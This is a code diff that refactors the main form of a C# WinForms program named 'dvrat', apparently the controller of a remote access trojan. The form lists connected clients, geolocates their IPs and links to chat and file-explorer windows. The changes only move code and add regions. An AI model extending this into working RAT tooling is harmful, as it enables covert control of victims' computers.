@@ -23,6 +23,14 @@ namespace dvrat
 {
     public partial class Form1 : Form
     {
+       
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        #region pub vars
+        //Pub vars in the namespace
         chat_form cht_frm;
         file_explorer_form fle_explr_frm;
         private IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8080);
@@ -30,22 +38,11 @@ namespace dvrat
         private Socket client_socket;
         private static Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         private int selected_client_index = 0;
-        public List<Socket> getClientsockets
-        {
-            get => clients_sockets;
-        }
-     
         private List<int> clients_online = new List<int>();
-        private string main_dirs_global_response = "";
-        public Form1()
-        {
-            InitializeComponent();
-        }
-
+        #endregion
 
         #region form functions
-#endregion
-        /* START form functions */
+        //its functions that mmake changes or help you to control form .
         private void exit_x_label_MouseHover(object sender, EventArgs e)
         {
             exit_x_label.ForeColor = Color.Black;
@@ -336,10 +333,6 @@ namespace dvrat
                 {
                     //pass
                 }
-                
-                
-                
-             
 
                 for (int i = 0; i < dataGridView1.Rows.Count; ++i)
                 {
@@ -390,11 +383,57 @@ namespace dvrat
             }
         }
 
-        /* END form functions */
+        private void dataGridView1_CellMouseMove(object sender, DataGridViewCellMouseEventArgs e)
+        {
+            if (e.RowIndex >= 0 && e.ColumnIndex >= 0)
+            {
+                this.selected_client_index = e.RowIndex;
+                selected_client_label.Text = $"SELECTED_CLIENT [ {this.selected_client_index} ]";
+            }
+        }
 
 
-        /* START server functions */
+        #endregion
 
+        #region helper functions
+        //it is Fucntions help you in someting like get info of an ip or get The size of data in string etc...
+        private string getIpInfo(string ip)
+        {
+            WebClient wb = new WebClient();
+            string ip_info = wb.DownloadString($"http://ip-api.com/json/{ip}");
+            return ip_info;
+        }
+
+        public string DataSize(long len)
+        {
+            if ((len.ToString().Length < 4))
+                return (len.ToString() + " Bytes");
+            string strsize = null;
+            double _size = (Convert.ToDouble(len) / 1024);
+            if ((_size < 1024))
+                strsize = "KB";
+            else
+            {
+                _size = (_size / 1024);
+                if ((_size < 1024))
+                    strsize = "MB";
+                else
+                {
+                    _size = (_size / 1024);
+                    strsize = "GB";
+                }
+            }
+            return (_size.ToString(".0") + " " + strsize);
+        }
+
+        private string[] xSplit(string toSplit, string splitOn)
+        {
+            return toSplit.Split(new string[] { splitOn }, StringSplitOptions.None);
+        }
+        #endregion
+
+        #region server functions 
+        //it is Functions that make changes/check/etc... with sockets and you use sockets in them .
 
         public bool send_to_client(Socket client, string message)
         {
@@ -403,11 +442,13 @@ namespace dvrat
                 int send_bytes = client.Send(Encoding.Default.GetBytes(message));
                 upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; upload_label.Refresh(); }));
                 return true;
-            }catch(Exception )
+            }
+            catch (Exception)
             {
                 return false;
             }
         }
+
 
         private int get_client_index(Socket client_socket)
         {
@@ -416,7 +457,7 @@ namespace dvrat
 
         public Socket get_client_by_index(int i)
         {
-            try 
+            try
             {
                 return this.clients_sockets[i];
             }
@@ -426,14 +467,8 @@ namespace dvrat
                 return null;
             }
         }
-        
 
-        private string getIpInfo(string ip)
-        {
-            WebClient wb = new WebClient();
-            string ip_info = wb.DownloadString($"http://ip-api.com/json/{ip}");
-            return ip_info;
-        }
+
 
         bool SocketConnected(Socket s)
         {
@@ -467,28 +502,7 @@ namespace dvrat
             }
         }
 
-        public string DataSize(long len)
-        {
-            if ((len.ToString().Length < 4))
-                return (len.ToString() + " Bytes");
-            string strsize = null;
-            double _size = (Convert.ToDouble(len) / 1024);
-            if ((_size < 1024))
-                strsize = "KB";
-            else
-            {
-                _size = (_size / 1024);
-                if ((_size < 1024))
-                    strsize = "MB";
-                else
-                {
-                    _size = (_size / 1024);
-                    strsize = "GB";
-                }
-            }
-            return (_size.ToString(".0") + " " + strsize);
-        }
-
+      
         private void refresh_clients()
         {
             while (true)
@@ -522,10 +536,7 @@ namespace dvrat
             }
         }
 
-        private string[] xSplit(string toSplit, string splitOn)
-        {
-            return toSplit.Split(new string[] { splitOn }, StringSplitOptions.None);
-        }
+
 
 
 
@@ -1009,19 +1020,10 @@ namespace dvrat
             }
         }
 
-        private void dataGridView1_CellMouseMove(object sender, DataGridViewCellMouseEventArgs e)
-        {
-            if (e.RowIndex >= 0 && e.ColumnIndex >= 0)
-            {
-                this.selected_client_index = e.RowIndex;
-                selected_client_label.Text = $"SELECTED_CLIENT [ {this.selected_client_index} ]";
-            }
-        }
-
-      
 
 
         /* END server functions */
+        #endregion
 
 
     }
